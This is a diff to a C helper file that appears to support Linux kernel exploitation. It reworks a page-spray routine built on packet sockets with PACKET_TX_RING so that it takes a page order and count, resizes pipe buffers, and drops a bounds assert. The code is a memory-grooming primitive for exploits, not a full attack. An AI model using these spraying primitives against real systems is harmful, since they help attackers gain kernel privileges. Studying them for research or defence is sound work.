@@ -568,7 +568,6 @@ void initPipeBuffer(int pipe_fd[PIPE_NUM][2]){
     }
 }
 void initPipeBufferN(int pipe_fd[PIPE_NUM][2],int num){
-    assert(num<=PIPE_NUM);
 
     for(int i  = 0 ; i < num ; i++)
     {
@@ -577,6 +576,7 @@ void initPipeBufferN(int pipe_fd[PIPE_NUM][2],int num){
     }
 }
 void pipeBufferResize(int fd,size_t count){
+    // pipe_buffer init
     size_t res = fcntl(fd,F_SETPIPE_SZ,0x1000*count);
     if(res ==0x1000*count)
         return;// info("PipeBuffer resized");
@@ -724,7 +724,10 @@ void sandbox()
     for(int i = 0 ; i < 0x100 ; i++)
         spaCmd(ALLOC_PAGE,i);
     ```
- */
+*/
+void pgvAdd(){
+
+}
 int sock_allocator_fd_child[2],sock_allocator_fd_parent[2];
 #define INITIAL_PAGE_SPRAY 1000
 int socketfds[INITIAL_PAGE_SPRAY];
@@ -737,8 +740,10 @@ typedef struct
 {
     enum spray_cmd cmd;
     int32_t idx;
+    size_t order;
+    size_t nr;
 }ipc_req_t;
-int _alloc_pages_via_sock(uint32_t size, uint32_t n)
+int _pvg_sock(uint32_t size, uint32_t n)
 {
     struct tpacket_req req;
     int32_t socketfd, version;
@@ -764,7 +769,7 @@ int _alloc_pages_via_sock(uint32_t size, uint32_t n)
 
     req.tp_block_size = size;
     req.tp_block_nr = n;
-    req.tp_frame_size = 4096;
+    req.tp_frame_size = PAGE_SIZE;
     req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
     
     if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0)
@@ -785,7 +790,7 @@ void _spray_comm_handler()
         assert(req.idx < INITIAL_PAGE_SPRAY);
         if (req.cmd == ADD)
         {
-            socketfds[req.idx] = _alloc_pages_via_sock(4096, 1);
+            socketfds[req.idx] = _pvg_sock(PAGE_SIZE * (1<<req.order), req.nr);
         }
         else if (req.cmd == FREE)
         {
@@ -797,19 +802,22 @@ void _spray_comm_handler()
 
 }
 
-void spaCmd(enum spray_cmd cmd, int idx)
+void pgvCmd(enum spray_cmd cmd, int idx, size_t order, size_t nr)
 {
     ipc_req_t req;
     int32_t result;
 
     req.cmd = cmd;
     req.idx = idx;
+    req.order = order;
+    req.nr = nr;
     write(sock_allocator_fd_child[1], &req, sizeof(req));
     read(sock_allocator_fd_parent[0], &result, sizeof(result));
     assert(result == idx);
 }
 
-void spaInit(){
+// void spaInit(){
+void pgvInit(){
     pipe(sock_allocator_fd_child);
     pipe(sock_allocator_fd_parent);
     if (!fork())
